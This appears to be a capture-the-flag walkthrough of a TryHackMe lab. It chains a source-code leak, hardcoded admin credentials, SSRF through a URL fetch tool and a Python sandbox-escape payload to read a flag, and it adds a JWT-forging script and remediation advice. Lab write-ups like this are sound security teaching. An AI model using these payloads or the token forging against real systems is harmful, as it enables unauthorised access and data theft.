### Overview
NovaDev Solutions is a software development house known for building secure enterprise platforms for clients across multiple countries and industries. Recently, NovaDev Solutions rolled out a new customer interaction feature on their website to improve communication between clients and developers.

Shortly after deployment, NovaDev began experiencing unusual traffic patterns and minor service disruptions. Internal developers suspect that something in the latest update may have exposed more than intended.

**Target IP:** 10.49.144.4

### Attack Chain Summary
This challenge demonstrates how multiple minor misconfigurations can chain together to achieve full compromise:
1. Information Disclosure (Source Code Leakage)
2. Server-Side Request Forgery (SSRF)
3. Python Sandbox Escape
4. Remote Code Execution (RCE)

### Step-by-Step Walkthrough

#### Phase 1: Initial Reconnaissance
Start with basic network reconnaissance to identify open ports and services.

```bash
nmap -sV -sC 10.49.144.4
```

**Expected Results:**
- Port 80/tcp: Open (HTTP)
- Port 22/tcp: Open (SSH)

When visiting the IP in a browser, you'll be redirected to `nova.thm`. Add this to your `/etc/hosts` file:
```
10.49.144.4    nova.thm
```

#### Phase 2: Directory Enumeration & Source Code Leakage
Perform directory enumeration to discover hidden endpoints and potential source code leaks.

```bash
dirsearch -u "http://nova.thm" -e php,html,js,txt,py,json,xml,bak,zip
```

**Key Findings:**
- `/app.py`: The backend source code (critical leak)
- `/admin/login`: Administrative login portal
- `/contact`: Contact form page

Accessing `http://nova.thm/app.py` reveals the raw Python source code containing sensitive information:

```python
# Snippet from leaked app.py
JWT_SECRET = os.environ.get("ADMIN_SECRET", "dev_secret_for_ctf")
ADMIN_USERNAME = "nova_admin_9f3b2c7d8e1a"
ADMIN_PASSWORD = "X7!rM9#Qp2@Lk$W4E8^BzA"

app.config["DATABASE_URL"] = "postgresql://app_user:********@db.internal:5432/novadev"
```

#### Phase 3: Credential Theft & Admin Access
Extract the admin credentials from the leaked source code:
- **Username:** nova_admin_9f3b2c7d8e1a
- **Password:** X7!rM9#Qp2@Lk$W4E8^BzA

Attempt to login at `http://nova.thm/admin/login` with these credentials.

#### Phase 4: Discover Internal QA URL Fetch Tool (SSRF Vector)
Inside the admin panel, locate the "Internal QA URL Fetch Tool" - this is a classic SSRF vulnerability indicator.

The source code revealed internal services like `db.internal` and `redis.internal`. Add these to your hosts file:
```
10.49.144.4    db.internal
10.49.144.4    redis.internal
10.49.144.4    internal.nova.thm
```

#### Phase 5: SSRF to Access Internal Services
By inputting `http://internal.nova.thm` into the Fetch Tool, the application renders the NovaDev Secure Python Sandbox.

#### Phase 6: Python Sandbox Escape
The sandbox appears to restrict dangerous functions but processes input via a `code` parameter in the URL.

To bypass the sandbox and read the flag directly, craft a specific Python payload using an iterator:

```
http://nova.thm/admin/fetch?url=http://internal.nova.thm?code=int(next(open('flag.txt')))
```

**Payload Breakdown:**
- `open('flag.txt')`: Opens the target file
- `next(...)`: Grabs the first line of the file
- `int()`: Converts to integer (required by sandbox filtering)

#### Phase 7: Flag Acquisition
The successful execution of the payload reveals the flag:

**Flag:** `THM{s4ndb0x_3sc4p3d_w1th_RCE_l1k3_4_pr0}`

### Alternative Approach: JWT Manipulation
From the leaked `app.py`, we also obtained the JWT secret. We can forge an admin JWT token:

```python
import jwt
import datetime

SECRET = "cc441eabd3ffb9fd211155ca37e1bdeff208f0a428d1913bb9e35759693de565"
ADMIN_USERNAME = "nova_admin_9f3b2c7d8e1a"

payload = {
    "user": ADMIN_USERNAME,
    "role": "admin",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(hours=1)).timestamp())
}

token = jwt.encode(payload, SECRET, algorithm="HS256")
print(token)
```

Use this token to access admin endpoints directly.

### Remediation Recommendations
1. **Remove Sensitive Files:** Ensure `.git` folders and source files like `app.py` are not accessible in production
2. **Environment Variables:** Never hardcode credentials in code; use secure secret management tools
3. **Input Validation:** Implement strict allow-lists for URLs in fetch tools to prevent SSRF
4. **Sandbox Security:** Properly restrict Python sandbox environments with comprehensive deny-lists
5. **JWT Security:** Always validate JWTs server-side; never trust client-modifiable claims
6. **Defense in Depth:** Implement multiple security layers rather than relying on obscurity

### Key Learning Points
- **Source Code Leakage:** A single exposed file can provide attackers with a complete roadmap
- **Chaining Vulnerabilities:** Minor misconfigurations can combine to create critical attack paths
- **SSRF Exploitation:** Internal services often have weaker protections than public-facing ones
- **Sandbox Escapes:** Restricted environments can often be bypassed with creative payloads
- **Information Disclosure:** Comments in public files are not private and can leak sensitive data

### References
- TryHackMe Love at First Breach 2026 - Advanced Track: Chains of Love
- OWASP Top 10: A01:2021-Broken Access Control
- OWASP Top 10: A10:2021-Server-Side Request Forgery (SSRF)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- CWE-94: Improper Control of Generation of Code ('Code Injection')